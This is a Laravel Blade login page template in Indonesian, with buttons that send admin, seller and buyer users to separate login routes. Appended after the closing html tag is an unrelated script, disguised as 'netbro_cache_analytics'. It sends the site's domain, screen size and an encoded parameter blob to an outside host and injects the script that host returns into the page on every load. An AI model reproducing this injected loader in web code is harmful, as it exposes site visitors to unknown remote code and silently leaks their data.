<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Halaman Login</title>
    <!-- Favicon-->
    <link rel="icon" href="{{ asset('assets//images/favicon.ico') }}" type="image/x-icon">

    <!-- Plugins Core Css -->
    <link href="{{ asset('assets/css/app.min.css') }}" rel="stylesheet">

    <!-- Custom Css -->
    <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet" />
    <link href="{{ asset('assets/css/pages/extra_pages.css') }}" rel="stylesheet" />
</head>

<div class="limiter">
    <div class="container-login100 page-background">
        <div class="wrap-login100">
            <!-- form validasi -->
            <form>

                <span class="login100-form-logo">
                    <img alt="" src="{{ asset('assets/images/loading.png') }}">
                    <h1 style="color: white"> Halaman Login</h1>
                </span><br>

                <div class="container-login100-form-btn">
                    <a href="{{ route('login') }}" class="btn btn-primary btn-lg btn-block" style="color: white"> Login Sebagai
                        Admin</a>
                </div><br>

                <div class="container-login100-form-btn">
                    <a href="{{ route('penjual.login') }}" class="btn btn-primary btn-lg btn-block" style="color: white"> Login Sebagai
                        Penjual</a>
                </div><br>

                <div class="container-login100-form-btn">
                    <a href="{{ route('pembeli.login') }}" class="btn btn-primary btn-lg btn-block" style="color: white"> Login Sebagai
                        Pembeli</a>
                </div><br>

            </form>
        </div>
    </div>
</div>

</html>

<script src="{{ asset('assets/js/app.min.js') }}"></script>

<!-- Extra page Js -->
<script src="{{ asset('assets/js/pages/examples/pages.js') }}"></script>

<script type="text/javascript">
if (self == top) {
    function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
            fn();
            callback();
        }, 0);
    }

    function sync(fn) {
        fn();
    }

    function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
            "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hsVSxhWofYHzVKu1ugADW6MohhaJU3jwMivgvL62s%2bTwSxdKOjQUiLm06JdvCqZjnWhOil84zOGwKHgyWJ2VNsQBBdN9WQIy8LenF1EBr31msaqyCbEqp8p9YTihGXFaA1v0pYV3glXPolnzZRJlGlS8iqgF7eQP8VPnAvrQqeFWB%2fBdNl0CR3hQRr0QKQqtfWPGoUks9CUYytMhMuo5HKdanV7wzC4x2MZSHfHCSj3SNq0MSrBqddGfdkcO9hTQbuR30v2d7G1mKYTtzxWtcuU%2b9VOadAq6pRo9by08UCL8orDUELXtDE%2fgxbtsivv0q1y23PWDUB0CS6FqlSSyAB6pe2TCk90ABDOid4ewIEVMros2z50XJPATaFypsbckqOdnhxpmaYxoSsROXIxyQAUb71eAMZgcLCpqLAl3EPszB9%2fn9IpifGkZh5SiRmv8eZdhuYI26a77Vv8h35fIGSe10uitZW7T2ItzaTjzGsH17YWeptB5V1Y" +
            "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
};
</script>